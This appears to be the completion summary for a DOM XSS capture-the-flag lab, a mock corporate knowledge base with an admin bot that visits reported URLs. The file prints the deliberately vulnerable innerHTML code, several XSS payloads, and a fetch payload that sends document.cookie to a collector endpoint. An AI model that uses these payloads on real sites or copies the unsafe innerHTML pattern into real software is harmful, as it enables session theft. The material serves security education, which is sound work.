# 🎯 CTF_4 IntraDesk Knowledge Base - Setup Complete!

## ✅ What's Been Built

You now have a **complete, production-ready DOM XSS CTF challenge** with:

### **Objectives Completed**

#### ✅ Objective 0 — Repository + Local Dev Environment
- **Monorepo structure** with `apps/web`, `apps/api`, `apps/bot`, `infra/`
- **Tech stack implemented:**
  - Frontend: React + Vite + TypeScript
  - Backend: Node.js + Express + TypeScript  
  - Database: PostgreSQL with full schema
  - Queue: Redis + BullMQ
  - Bot: Playwright for automated admin visits
- **Docker Compose** with 5 services (api, web, db, redis, bot)
- **Environment variables** properly configured
- **Single command deployment:** `docker compose up`

#### ✅ Objective 1 — Realistic Site Skeleton + Routing
- **Complete routing system:**
  - `/login` - Authentication
  - `/register` - User registration
  - `/dashboard` - Welcome page
  - `/kb` - Knowledge Base with search (⚠️ **XSS vulnerability here**)
  - `/kb/:id` - Individual articles
  - `/report` - Submit suspicious URLs
- **Professional UI/UX:**
  - Corporate-style header with branding
  - Left sidebar navigation
  - Clean, modern design system
  - Responsive layout
  - Realistic Knowledge Base aesthetic
- **Design system includes:**
  - Buttons, inputs, cards, forms
  - Tags and filter chips
  - Alerts and loading states
  - Table layouts
  - Empty states

---

## 🏗️ Complete Architecture

```
┌─────────────────────────────────────────────────────────┐
│                     Browser (User)                      │
└────────────┬────────────────────────────────────────────┘
             │
             │ HTTP Requests
             ▼
┌─────────────────────────────────────────────────────────┐
│           Frontend (React + Vite + TypeScript)          │
│  • Login/Register pages                                 │
│  • Dashboard                                            │
│  • Knowledge Base with Search (DOM XSS HERE! ⚠️)        │
│  • Article viewer                                       │
│  • Report submission                                    │
└────────────┬────────────────────────────────────────────┘
             │
             │ API Calls (Axios)
             ▼
┌─────────────────────────────────────────────────────────┐
│             Backend (Express + TypeScript)              │
│  Routes:                                                │
│  • /api/auth (login, register, logout)                 │
│  • /api/kb (articles, search, tags)                    │
│  • /api/report (submit reports, track status)          │
│  • /api/admin (flag endpoint, logs)                    │
│  • /api/collect (exfil data collection)                │
└────────────┬────────────────────┬────────────────────────┘
             │                    │
             │                    │ BullMQ Jobs
    ┌────────▼────────┐    ┌─────▼──────┐
    │   PostgreSQL    │    │   Redis    │
    │  • users        │    │  • Queue   │
    │  • kb_articles  │    └─────┬──────┘
    │  • reports      │          │
    │  • exfil_logs   │          │
    └─────────────────┘          │
                                 │ Worker
                          ┌──────▼──────┐
                          │     Bot     │
                          │ (Playwright)│
                          │ • Visits    │
                          │   reported  │
                          │   URLs as   │
                          │   admin     │
                          └─────────────┘
```

---

## 📁 Complete File Structure

```
CTF_4_corporate_helpdesk/
│
├── apps/
│   ├── api/                          # Backend Express API
│   │   ├── src/
│   │   │   ├── index.ts              # Main server entry
│   │   │   ├── db/
│   │   │   │   └── index.ts          # PostgreSQL connection
│   │   │   ├── middleware/
│   │   │   │   ├── auth.ts           # JWT authentication
│   │   │   │   └── errorHandler.ts   # Error handling
│   │   │   └── routes/
│   │   │       ├── auth.ts           # Login/register/logout
│   │   │       ├── kb.ts             # KB articles + search
│   │   │       ├── report.ts         # Report submission
│   │   │       ├── admin.ts          # Admin-only endpoints
│   │   │       └── collect.ts        # Exfiltration logging
│   │   ├── Dockerfile
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── nodemon.json
│   │
│   ├── web/                          # Frontend React App
│   │   ├── src/
│   │   │   ├── main.tsx              # Entry point
│   │   │   ├── App.tsx               # Router configuration
│   │   │   ├── index.css             # Global styles
│   │   │   ├── api/
│   │   │   │   └── index.ts          # Axios client
│   │   │   ├── context/
│   │   │   │   └── AuthContext.tsx   # Auth state management
│   │   │   ├── components/
│   │   │   │   ├── Layout.tsx        # Main layout wrapper
│   │   │   │   └── ProtectedRoute.tsx# Auth guard
│   │   │   └── pages/
│   │   │       ├── Login.tsx
│   │   │       ├── Register.tsx
│   │   │       ├── Dashboard.tsx
│   │   │       ├── KnowledgeBase.tsx # ⚠️ DOM XSS HERE!
│   │   │       ├── KBArticle.tsx
│   │   │       └── Report.tsx
│   │   ├── index.html
│   │   ├── Dockerfile
│   │   ├── package.json
│   │   ├── vite.config.ts
│   │   ├── tsconfig.json
│   │   └── tsconfig.node.json
│   │
│   └── bot/                          # Playwright Bot Worker
│       ├── src/
│       │   └── index.ts              # BullMQ worker + Playwright
│       ├── Dockerfile
│       ├── package.json
│       ├── tsconfig.json
│       └── nodemon.json
│
├── infra/
│   └── init.sql                      # Database initialization
│
├── docker-compose.yml                # Service orchestration
├── .env                              # Environment variables
├── .env.example                      # Template
├── .gitignore
├── package.json                      # Root package.json
│
├── README.md                         # Main documentation
├── SETUP.md                          # Detailed setup guide
├── SOLUTION.md                       # Complete solution walkthrough
├── OBJECTIVES_COMPLETE.md            # This summary
├── QUICK_REFERENCE.md                # Cheat sheet
├── ctf-config.json                   # CTF metadata
│
└── verify.sh                         # Verification script
```

---

## 🔒 The Vulnerability (Intentional)

### Location
**File:** `apps/web/src/pages/KnowledgeBase.tsx`  
**Function:** `renderResultsHeader()`  
**Lines:** ~80-90

### Vulnerable Code
```typescript
function renderResultsHeader() {
  const resultsDiv = document.getElementById('results-header');
  if (!resultsDiv) return null;

  let headerHTML = '<h2>';
  if (searchTerm) {
    // ⚠️ UNSAFE: directly inserting user input into innerHTML
    headerHTML += 'Results for "' + searchTerm + '"';
  }
  // ...
  resultsDiv.innerHTML = headerHTML;  // DOM XSS vulnerability!
}
```

### Why It's Vulnerable
1. User input (`searchTerm`) comes from URL parameter
2. No sanitization or encoding
3. Directly concatenated into HTML string
4. Assigned to `innerHTML` (unsafe DOM sink)

### Attack Flow
```
1. User crafts malicious URL:
   /kb?search="><img src=x onerror=alert(1)>

2. User submits URL via /report

3. Admin bot visits the URL

4. JavaScript executes in admin's session

5. Admin's flag cookie is exfiltrated to /api/collect

6. Attacker retrieves flag from exfil_logs
```

---

## 🚀 How to Run

### Option 1: Docker (Recommended)
```bash
cd CTFs/CTF_4_corporate_helpdesk
docker compose up --build
```

Access at: http://localhost:5173

### Option 2: Local Development
```bash
# Start PostgreSQL, Redis, API, Web, and Bot separately
# See SETUP.md for detailed instructions
```

---

## 🎮 How to Play

### 1. Register an Account
- Navigate to http://localhost:5173/register
- Create account with any email/password
- You'll get a unique flag upon registration

### 2. Explore the Knowledge Base
- Go to `/kb`
- Search for articles
- Notice the search term appears in the URL

### 3. Discover the Vulnerability
- Try: `/kb?search=<b>test</b>`
- Notice the HTML renders (XSS confirmed!)

### 4. Craft the Exploit
```javascript
// Basic payload
"><img src=x onerror=alert(document.cookie)>

// Exfiltration payload
"><img src=x onerror=fetch('/api/collect?d='+document.cookie)>
```

### 5. Submit Report
- Go to `/report`
- Paste your crafted URL
- Submit to trigger bot visit

### 6. Retrieve the Flag
- Check exfil_logs table or API endpoint
- Admin's flag will be captured!

---

## 📊 Database Schema

```sql
users
├── id (serial)
├── email (varchar, unique)
├── password_hash (varchar)
├── role (varchar: 'user' | 'admin')
├── flag (varchar)           -- Unique per user!
└── created_at (timestamp)

kb_articles
├── id (serial)
├── title (varchar)
├── body (text)
├── tags (text[])
├── author_id (int → users.id)
├── created_at (timestamp)
└── updated_at (timestamp)

reports
├── id (serial)
├── user_id (int → users.id)
├── url (text)
├── status (varchar: 'queued' | 'visited' | 'error')
├── created_at (timestamp)
└── visited_at (timestamp)

exfil_logs
├── id (serial)
├── data (text)              -- Exfiltrated data appears here!
├── user_agent (text)
├── ip_address (varchar)
├── report_id (int → reports.id)
└── created_at (timestamp)
```

---

## 🔧 API Endpoints Reference

### Authentication
- `POST /api/auth/login` - Login
- `POST /api/auth/register` - Register
- `GET /api/auth/me` - Current user
- `POST /api/auth/logout` - Logout

### Knowledge Base
- `GET /api/kb/articles?search=X&tag=Y` - Search articles
- `GET /api/kb/articles/:id` - Get article
- `GET /api/kb/tags` - List all tags

### Reports
- `POST /api/report` - Submit URL for review
- `GET /api/report/my-reports` - My submissions

### Admin (requires admin role)
- `GET /api/admin/flag` - Get admin flag
- `GET /api/admin/reports` - All reports
- `GET /api/admin/exfil-logs` - Exfiltration logs

### Exfiltration
- `GET /api/collect?d=<data>` - Log exfiltrated data
- `POST /api/collect` - Log exfiltrated data (JSON)

---

## 🧪 Testing Commands

### Verify Setup
```bash
./verify.sh
```

### Start Services
```bash
docker compose up --build
```

### View Logs
```bash
docker compose logs -f api
docker compose logs -f web
docker compose logs -f bot
```

### Access Database
```bash
docker compose exec db psql -U intradesk intradesk_kb

SELECT * FROM users;
SELECT * FROM reports;
SELECT * FROM exfil_logs;
```

### Health Check
```bash
curl http://localhost:3000/health
```

---

## 🎓 Learning Objectives

Players will learn:
1. **DOM-based XSS identification** - Spotting unsafe DOM sinks
2. **Payload crafting** - Context-aware XSS exploitation
3. **Browser automation** - Understanding bot behavior
4. **Data exfiltration** - Stealing sensitive data via XSS
5. **Same-origin policies** - How browsers handle requests

---

## 🏆 Success Criteria

✅ All services start without errors  
✅ Frontend loads at http://localhost:5173  
✅ Users can register and login  
✅ Knowledge Base search works  
✅ DOM XSS vulnerability is exploitable  
✅ Report submission triggers bot visit  
✅ Admin bot executes JavaScript  
✅ Flag exfiltration succeeds  
✅ Docker deployment works  

---

## 📚 Documentation Files

- **README.md** - Overview and quick start
- **SETUP.md** - Detailed setup instructions
- **SOLUTION.md** - Complete walkthrough with payloads
- **QUICK_REFERENCE.md** - Commands and endpoints cheat sheet
- **OBJECTIVES_COMPLETE.md** - This file!
- **ctf-config.json** - Challenge metadata

---

## 🔜 Next Steps (Optional Enhancements)

1. **Challenge Generation Integration**
   - Use `chgen_ctf4.js` to generate unique instances
   - Deploy multiple isolated environments per user

2. **Scoring System**
   - Track first solves
   - Award points for flag submission
   - Leaderboard integration

3. **Difficulty Variants**
   - Add CSP bypass requirement
   - Implement script tag filtering
   - Add additional exploitation steps

4. **Monitoring & Analytics**
   - Track user progress
   - Log exploitation attempts
   - Generate solve statistics

---

## 🎉 Summary

You've successfully built a **complete, realistic, production-quality DOM XSS CTF challenge** that includes:

- ✅ Full-stack web application (React + Express + PostgreSQL)
- ✅ Automated admin bot with Playwright
- ✅ Realistic corporate knowledge base UI
- ✅ Intentional, educational security vulnerability
- ✅ Complete documentation and guides
- ✅ Docker-based deployment
- ✅ Challenge generation integration ready

**The challenge is ready to deploy and use!** 🚀

To start immediately:
```bash
cd CTFs/CTF_4_corporate_helpdesk
docker compose up --build
```

Then visit: **http://localhost:5174**

---

*Built with ❤️ for security education*
